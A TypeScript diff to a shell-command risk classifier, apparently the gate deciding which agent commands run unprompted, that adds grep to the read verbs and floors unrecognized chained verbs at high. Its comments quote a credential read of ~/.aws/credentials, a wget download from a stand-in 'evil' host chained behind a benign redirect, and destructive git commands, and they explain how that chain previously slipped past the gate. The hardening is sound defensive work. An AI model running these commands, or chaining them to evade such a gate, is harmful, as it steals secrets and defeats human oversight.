@@ -438,7 +438,11 @@ function detectCatastrophicSignal(command: string): TierSignal | null {
 
 const NON_DESTRUCTIVE_MUTATORS = new Set(["mv", "cp", "tee", "install"]);
 const DESTRUCTIVE_SIMPLE_VERBS = new Set(["truncate"]);
-const READ_VERBS = new Set(["cat", "less", "head", "tail"]);
+// `grep` is included (Gate 9 finding 2): it reads arbitrary files exactly like cat/head/tail, so an
+// exfil read of a protected path (`grep AKIA ~/.aws/credentials`) must hit signal 10's high floor too,
+// not ride the built-in allowlist down to `low`. handleReadVerb treats its last non-flag operand as the
+// read target — an ordinary in-workspace `grep -rn TODO .` still resolves contained and stays low.
+const READ_VERBS = new Set(["cat", "less", "head", "tail", "grep"]);
 
 function evaluateExtractedTarget(
 	rawTarget: string,
@@ -603,6 +607,73 @@ function extractTargetSignals(command: string, workspace: WorkspacePolicyOptions
 }
 
 // ---------------------------------------------------------------------------------------------
+// Signal 7 (per-segment) — unrecognized command-position token (ADR §3.2 signal 7; Gate 9 finding 1).
+//
+// The empty-signals fallback below applies signal 7 only to a command that produced NO signal at all.
+// That left a hole: `echo ok > out.txt && wget http://evil -O /tmp/x` produces a benign redirect signal
+// (medium) for the first segment, so the fallback is skipped and the *unrecognized* second segment
+// (`wget ...`, which extractTargetSignals emits nothing for) is never floored — the whole command rode
+// `medium`, `provablyContained` stayed true, and it became --yes-eligible. R1 requires the opposite:
+// inability to prove a segment safe ⇒ tier ≥ high. This pass applies signal 7 PER top-level segment, so
+// every unrecognized command-position verb floors at high regardless of what else fired. A segment led
+// by a KNOWN verb is left alone: routine allowlisted verbs and the target/read verbs (whose own signals,
+// or the whole-command allowlist/grant, already account for them). It is skipped entirely for a command
+// that is a whole-command grant/allowlist match (vetted as one unit — FR-3's `npm test`, the routine
+// allowlist), so those stay low.
+// ---------------------------------------------------------------------------------------------
+
+/**
+ * Command-position verbs safe to lead a segment without flooring it at high: the args-independent
+ * built-in allowlist verbs plus every verb extractTargetSignals handles (whose own signals, e.g. a
+ * protected-path target, already carry the danger). Any OTHER leading verb in a segment is unrecognized
+ * and floored at high by detectUnrecognizedSegments.
+ *
+ * `git` is deliberately NOT here: it is arg-dependent-dangerous (`git clean -fdx`, `git reset --hard`,
+ * `git push`), so it must not be blanket-recognized in a chain. A single `git status`/`git diff` still
+ * lands low because it is a WHOLE-command allowlist match, which skips this per-segment pass entirely
+ * (see classifyCommand's `!grant && !builtinAllow` gate) — so nothing is lost by leaving git out, while
+ * `echo ok > x && git clean -fdx` is correctly floored at high instead of riding the redirect's medium.
+ */
+const KNOWN_LEADING_VERBS = new Set<string>([
+	"ls",
+	"pwd",
+	"grep",
+	"echo",
+	"rm",
+	"dd",
+	"mv",
+	"cp",
+	"tee",
+	"install",
+	"truncate",
+	"cat",
+	"less",
+	"head",
+	"tail",
+]);
+
+function detectUnrecognizedSegments(command: string): TierSignal[] {
+	const signals: TierSignal[] = [];
+	for (const segment of splitTopLevelSegments(command)) {
+		const trimmedSegment = segment.trim();
+		if (trimmedSegment.length === 0) continue;
+		const leadingMatch = trimmedSegment.match(/^(\S+)\s*([\s\S]*)$/);
+		const verbToken = leadingMatch?.[1];
+		if (verbToken === undefined) continue;
+		const verb = basenameVerb(verbToken);
+		if (!KNOWN_LEADING_VERBS.has(verb)) {
+			signals.push({
+				kind: "unrecognized-token",
+				tier: "high",
+				detail:
+					"a command-position token in this segment does not map to a recognized verb — fail-closed lexical floor applied per segment, so a benign signal elsewhere cannot mask it (R1, signal 7)",
+			});
+		}
+	}
+	return signals;
+}
+
+// ---------------------------------------------------------------------------------------------
 // Signal 1 — allowlist (built-in known-safe shapes, or a policy.json grant). Only ever consulted
 // when NOTHING else raised a signal (ADR §3.2's walkthrough: allowlist never masks an indirection
 // signal firing elsewhere in the same command).
@@ -681,15 +752,27 @@ export function classifyCommand(command: string, ctx: ClassificationContext): Cl
 	signals.push(...detectIndirectionSignals(command));
 	signals.push(...extractTargetSignals(command, ctx.workspace));
 
+	// A whole-command grant or built-in allowlist match authorizes the EXACT command string as one
+	// vetted unit — when it applies, the per-segment unrecognized-verb floor below is not imposed on it
+	// (FR-3's `npm test` grant, and the routine allowlist, must stay low). Computed once here so it
+	// gates both the per-segment pass and the empty-signals fallback identically.
+	const grant = matchPolicyGrant(trimmed, ctx.policy?.allowlist);
+	const builtinAllow = grant ? false : matchesBuiltinAllowlist(trimmed);
+
+	// Gate 9 finding 1: apply signal 7 PER SEGMENT (see detectUnrecognizedSegments) so an unrecognized
+	// command chained after a benign signal cannot ride that benign tier below `high`.
+	if (!grant && !builtinAllow) {
+		signals.push(...detectUnrecognizedSegments(command));
+	}
+
 	if (signals.length === 0) {
-		const grant = matchPolicyGrant(trimmed, ctx.policy?.allowlist);
 		if (grant) {
 			signals.push({
 				kind: "policy-allowlist-grant",
 				tier: grant.risk,
 				detail: `matched policy.json allowlist grant "${grant.pattern}" (FR-3)`,
 			});
-		} else if (matchesBuiltinAllowlist(trimmed)) {
+		} else if (builtinAllow) {
 			signals.push({ kind: "allowlisted", tier: "low", detail: "matches a built-in known-safe command shape" });
 		} else {
 			signals.push({
